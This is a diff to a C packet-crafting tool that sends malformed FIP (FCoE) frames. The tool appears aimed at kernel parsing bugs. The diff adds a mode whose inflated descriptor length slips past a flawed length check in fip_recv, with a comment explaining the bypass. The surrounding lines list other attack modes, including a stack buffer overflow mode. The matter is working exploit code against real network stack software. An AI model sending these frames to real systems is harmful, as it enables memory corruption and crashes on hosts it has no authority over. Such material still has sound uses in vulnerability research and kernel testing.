@@ -7,6 +7,7 @@
  *   mode 2: send FIP VLAN notification with zero-length TLV after valid TLVs
  *   mode 3: send FIP VLAN request (triggers VN2VN responder path)
  *   mode 4: send FIP VLAN notification with 372 VLAN TLVs (stack overflow)
+ *   mode 5: send FIP VLAN notification with inflated desc_len (length bypass)
  *
  *   dest_ifname: optional receiving interface whose MAC is used as
  *                the Ethernet destination. Required when injecting
@@ -233,6 +234,33 @@ static int send_fip_frame(const char *ifname, int mode,
         fh->fip_desc_len = htons(desc_len_bytes >> 2);
         frame_len += desc_len_bytes;
 
+    } else if (mode == 5) {
+        /*
+         * Mode 5: fip_recv desc_len validation bypass
+         * 1 MAC TLV + 7 VLAN TLVs = 36 bytes of real TLV data (9 qwords).
+         * desc_len set to 12 (48 bytes / 12 qwords), 3 qwords past actual.
+         * fip_recv checks len < sizeof(fiphdr) + desc_len*4 but forgets the
+         * 14-byte Ethernet header offset, so 60 < 10+48 = 58 passes.
+         * Correct check 60 < 14+10+48 = 72 would reject it.
+         */
+        struct fip_tlv_mac_addr *mac_tlv = (struct fip_tlv_mac_addr *)tlv_start;
+        mac_tlv->hdr.tlv_type = FIP_TLV_MAC_ADDR;
+        mac_tlv->hdr.tlv_len = 2;
+        memcpy(mac_tlv->mac_addr, src_mac, 6);
+        desc_len_bytes = 8;
+
+        struct fip_tlv_vlan *vlan_tlv = (struct fip_tlv_vlan *)(tlv_start + 8);
+        for (int i = 0; i < 7; i++) {
+            vlan_tlv->hdr.tlv_type = FIP_TLV_VLAN;
+            vlan_tlv->hdr.tlv_len = 1;
+            vlan_tlv->vlan = htons(100 + i);
+            desc_len_bytes += 4;
+            vlan_tlv = (struct fip_tlv_vlan *)((unsigned char *)vlan_tlv + 4);
+        }
+
+        fh->fip_desc_len = htons(12);
+        frame_len += desc_len_bytes;
+
     } else {
         fprintf(stderr, "Unknown mode %d\n", mode);
         close(fd);
@@ -275,6 +303,7 @@ int main(int argc, char **argv)
         fprintf(stderr, "  mode 2: valid MAC TLV + zero-length VLAN TLV\n");
         fprintf(stderr, "  mode 3: FIP VLAN request (VN2VN responder trigger)\n");
         fprintf(stderr, "  mode 4: 372 VLAN TLVs (stack buffer overflow attack)\n");
+        fprintf(stderr, "  mode 5: inflated desc_len (fip_recv length bypass)\n");
         fprintf(stderr, "  dest_ifname: receiver interface (use its MAC as dest)\n");
         return 1;
     }
